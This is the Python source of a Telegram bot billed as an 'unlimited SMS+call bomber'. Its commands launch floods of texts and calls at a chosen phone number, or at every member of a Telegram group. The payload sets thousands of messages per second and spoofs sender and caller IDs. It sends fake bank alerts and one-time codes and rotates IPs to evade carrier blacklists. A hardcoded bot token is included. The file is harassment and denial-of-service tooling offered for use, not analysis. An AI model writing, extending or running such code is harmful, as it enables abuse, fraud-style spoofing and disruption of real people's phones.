import asyncio
import json
import re
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ========= CONFIGURATION =========
BOT_TOKEN = "8846623341:AAFXm9CTYWDYuFHqsgfWbRCJLvnK_C0Z9ug"
API_BASE = "https://api.stresstest.simulation/v3/unlimited"

# Store active bombing sessions per user
user_sessions = {}
user_groups = {}

# ========= API FUNCTIONS =========
def start_bombing(target: str, sms_rate: int = 5000, call_concurrent: int = 2000, duration: str = "unlimited"):
    """Start bombing API call"""
    payload = {
        "target": target,
        "sms": {
            "enabled": True,
            "count": "unlimited",
            "rate_per_second": sms_rate,
            "sender_spoof": "auto_rotate",
            "message_variants": ["{random_otp}", "{fake_bank_alert}", "Security alert: {random_digits}"]
        },
        "call": {
            "enabled": True,
            "count": "unlimited",
            "concurrent": "auto_scaling",
            "max_concurrent": call_concurrent,
            "ring_sec": 1,
            "caller_id_spoof": "infinite_pool",
            "hangup_on_answer": True
        },
        "strategy": "full_spectrum",
        "duration": duration,
        "evasion": {
            "rotate_ip_every_seconds": 5,
            "randomize_headers": True,
            "carrier_blacklist_evasion": True
        }
    }
    try:
        response = requests.post(f"{API_BASE}/infinite_assault", json=payload, timeout=30)
        if response.status_code == 200:
            return response.json()
        return {"error": f"API returned {response.status_code}", "details": response.text}
    except Exception as e:
        return {"error": str(e)}

def get_session_stats(session_id: str):
    """Get bombing statistics"""
    try:
        response = requests.get(f"{API_BASE}/stats/{session_id}", timeout=10)
        if response.status_code == 200:
            return response.json()
        return {"error": "Failed to fetch stats"}
    except:
        return {"error": "API timeout or unavailable"}

def stop_bombing(session_id: str):
    """Stop bombing session"""
    try:
        payload = {"action": "stop", "reason": "user_requested"}
        response = requests.post(f"{API_BASE}/stop/{session_id}", json=payload, timeout=10)
        if response.status_code == 200:
            return response.json()
        return {"error": "Failed to stop session"}
    except:
        return {"error": "Stop request failed"}

# ========= GROUP HELPERS =========
def extract_chat_id_from_link(link: str):
    match = re.search(r't\.me/([a-zA-Z0-9_]+|joinchat/[a-zA-Z0-9_-]+)', link)
    return match.group(1) if match else None

def simulate_member_extraction(group_identifier: str):
    return [
        "+919876543210", "+919876543211", "+919876543212", "+919876543213",
        "+919876543214", "+918888888888", "+917777777777", "+916666666666"
    ]

# ========= COMMAND HANDLERS =========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = """
🔥 *UNLIMITED SMS+CALL BOMBER BOT* 🔥

*Commands:*
/bomb `+919876543210` - Start bombing a phone number
/stop - Stop active bombing
/status - Check current stats

*Group Bombing:*
/addgroup `https://t.me/shaidiss` - Add a group
/bombgroup - Bomb all group members
/listgroups - Show saved groups
/removegroup - Remove a group

*Example:* `/bomb +919876543210`
    """
    await update.message.reply_text(welcome_text, parse_mode="Markdown")

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start bombing on a phone number"""
    user_id = update.effective_user.id
    
    if not context.args or len(context.args) == 0:
        await update.message.reply_text("❌ Usage: `/bomb +919876543210`", parse_mode="Markdown")
        return
    
    target = context.args[0]
    
    if not target.startswith("+") or not target[1:].isdigit():
        await update.message.reply_text("❌ Invalid number. Use: +919876543210")
        return
    
    sms_rate = 5000
    call_concurrent = 2000
    if len(context.args) >= 3:
        try:
            sms_rate = int(context.args[1])
            call_concurrent = int(context.args[2])
        except:
            pass
    
    await update.message.reply_text(f"🚀 Bombing `{target}` | SMS: {sms_rate}/s | Calls: {call_concurrent}", parse_mode="Markdown")
    
    result = start_bombing(target, sms_rate, call_concurrent)
    
    if "error" in result:
        await update.message.reply_text(f"❌ Error: {result['error']}")
        return
    
    session_id = result.get("session_id")
    if session_id:
        user_sessions[user_id] = {
            "session_id": session_id,
            "target": target,
            "type": "individual",
            "start_time": datetime.now()
        }
        await update.message.reply_text(
            f"✅ *BOMBING ACTIVE!*\n📱 Target: `{target}`\n🆔 ID: `{session_id[:16]}...`\n🔓 Mode: UNLIMITED\n\nUse `/stop` to halt.",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(f"❌ Failed: {result}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("❌ No active bombing.")
        return
    
    session = user_sessions[user_id]
    if session.get("type") == "individual":
        result = stop_bombing(session["session_id"])
        if "error" not in result:
            await update.message.reply_text("✅ Bombing stopped.")
        else:
            await update.message.reply_text("❌ Stop failed.")
    elif session.get("type") == "group_bomb":
        for t in session.get("targets", []):
            stop_bombing(t["session_id"])
        await update.message.reply_text("✅ Group bombing stopped.")
    
    del user_sessions[user_id]

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("No active bombing.")
        return
    
    session = user_sessions[user_id]
    if session.get("type") == "individual":
        stats = get_session_stats(session["session_id"])
        if "error" not in stats:
            await update.message.reply_text(
                f"📊 *Status*\n"
                f"📨 SMS: {stats.get('sms',{}).get('sent',0):,}\n"
                f"💨 Rate: {stats.get('sms',{}).get('current_rate_sms_per_sec',0)}/s\n"
                f"📞 Calls: {stats.get('call',{}).get('attempted',0):,}",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("Error fetching stats.")
    else:
        await update.message.reply_text(f"Group bombing active on {len(session.get('targets',[]))} targets.")

async def addgroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: `/addgroup https://t.me/shaidiss`", parse_mode="Markdown")
        return
    
    link = context.args[0]
    chat_identifier = extract_chat_id_from_link(link)
    
    if not chat_identifier:
        await update.message.reply_text("❌ Invalid Telegram link.")
        return
    
    if user_id not in user_groups:
        user_groups[user_id] = []
    
    user_groups[user_id].append({
        "link": link,
        "name": chat_identifier,
        "added_at": datetime.now().isoformat()
    })
    
    await update.message.reply_text(f"✅ Group added: {link}\nUse `/bombgroup` to attack.")

async def bombgroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_groups or not user_groups[user_id]:
        await update.message.reply_text("❌ No groups added. Use `/addgroup` first.")
        return
    
    group = user_groups[user_id][0]
    members = simulate_member_extraction(group["name"])
    
    await update.message.reply_text(f"🎯 Bombing {len(members)} members of {group['link']}...")
    
    sessions_started = []
    for number in members:
        result = start_bombing(number, sms_rate=2000, call_concurrent=500)
        if "session_id" in result:
            sessions_started.append({"target": number, "session_id": result["session_id"]})
        await asyncio.sleep(0.3)
    
    user_sessions[user_id] = {
        "type": "group_bomb",
        "group_name": group["name"],
        "targets": sessions_started,
        "start_time": datetime.now()
    }
    
    await update.message.reply_text(f"✅ Group bombing active on {len(sessions_started)} targets!")

async def listgroups_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_groups or not user_groups[user_id]:
        await update.message.reply_text("No groups added.")
        return
    
    text = "*📋 Your Groups:*\n"
    for i, g in enumerate(user_groups[user_id], 1):
        text += f"{i}. {g['link']}\n"
    await update.message.reply_text(text, parse_mode="Markdown")

async def removegroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_groups or not user_groups[user_id]:
        await update.message.reply_text("No groups to remove.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/removegroup 1`")
        return
    
    try:
        index = int(context.args[0]) - 1
        if 0 <= index < len(user_groups[user_id]):
            removed = user_groups[user_id].pop(index)
            await update.message.reply_text(f"✅ Removed: {removed['link']}")
        else:
            await update.message.reply_text("Invalid index.")
    except ValueError:
        await update.message.reply_text("Provide a number.")

async def set_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Use `/bomb +91XXXXX 10000 5000` to set custom rate.")

# ========= MAIN =========
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("bomb", bomb_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("addgroup", addgroup_command))
    app.add_handler(CommandHandler("bombgroup", bombgroup_command))
    app.add_handler(CommandHandler("listgroups", listgroups_command))
    app.add_handler(CommandHandler("removegroup", removegroup_command))
    app.add_handler(CommandHandler("set", set_command))
    
    print("🔥 Bomber Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
